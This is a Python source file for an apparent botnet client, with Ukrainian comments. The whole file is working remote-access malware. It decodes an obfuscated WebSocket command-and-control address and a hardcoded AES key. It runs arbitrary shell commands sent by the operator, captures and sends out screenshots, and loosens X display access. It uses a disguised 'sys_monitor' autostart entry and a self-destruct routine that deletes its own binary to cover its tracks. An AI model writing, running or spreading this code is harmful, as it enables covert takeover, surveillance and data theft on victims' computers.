import asyncio
import websockets
import sys
import subprocess
import os
import base64
import uuid
import shutil
from io import BytesIO

def _imp(name):
    try: return __import__(name)
    except: return None

crypto = _imp("Crypto.Cipher") or _imp("Cryptodome.Cipher")
AES = crypto.AES if crypto else None
PIL_IG = _imp("PIL.ImageGrab")

_S = "d3M6Ly8xOTIuMTY4LjEwLjgyOjgwMDAvd3Mv"
_K = "QU1ZX0JPVE5FVF8yMDI2X1NFQ1VSRV9LRVlfVjJfMzI="

def get_cfg(v): return base64.b64decode(v)
def get_bot_id(): return f"bot_{hex(uuid.getnode())[2:10]}"

def dec(m):
    try:
        raw = base64.b64decode(m)
        c = AES.new(get_cfg(_K), AES.MODE_GCM, nonce=raw[:16])
        return c.decrypt_and_verify(raw[32:], raw[16:32]).decode('utf-8')
    except: return None

def enc(msg):
    c = AES.new(get_cfg(_K), AES.MODE_GCM)
    ct, tag = c.encrypt_and_digest(msg.encode('utf-8'))
    return base64.b64encode(c.nonce + tag + ct).decode('utf-8')

# --- НОВИЙ МОДУЛЬ: SELF-DESTRUCT ---
def self_destruct():
    """Видаляє бінарний файл та автозапуск перед виходом"""
    try:
        # Видалення автозапуску
        if sys.platform != "win32":
            path = os.path.expanduser("~/.config/autostart/sys_monitor.desktop")
            if os.path.exists(path): os.remove(path)
        
        # Спроба видалити сам себе (працює через shell-команду)
        my_path = os.path.abspath(sys.argv[0])
        subprocess.Popen(f"sleep 2 && rm -f {my_path}", shell=True)
        sys.exit(0)
    except: sys.exit(0)

async def start():
    b_id = get_bot_id()
    # Примусове налаштування графіки для бінарника
    if sys.platform != "win32":
        os.environ["DISPLAY"] = ":0"
        try: subprocess.run(["xhost", "+local:root"], capture_output=True)
        except: pass

    while True:
        try:
            async with websockets.connect(get_cfg(_S).decode() + b_id) as ws:
                while True:
                    m = await ws.recv()
                    cmd = dec(m)
                    if not cmd: continue

                    ans = ""
                    if cmd.startswith("shell:"):
                        r = subprocess.run(cmd[6:], shell=True, capture_output=True, text=True)
                        ans = (r.stdout + r.stderr) or "Success."
                    elif cmd == "screenshot":
                        if PIL_IG:
                            try:
                                buf = BytesIO()
                                PIL_IG.ImageGrab.grab().save(buf, format="PNG")
                                ans = f"SCREENSHOT:{base64.b64encode(buf.getvalue()).decode()}"
                            except Exception as e: ans = f"Scr Error: {str(e)}"
                        else: ans = "Err: PIL missing"
                    elif cmd == "self_destruct":
                        await ws.send(enc("Goodbye. Self-destruct initiated."))
                        self_destruct()
                    else: ans = f"Unknown: {cmd}"
                    
                    await ws.send(enc(ans))
        except: await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(start())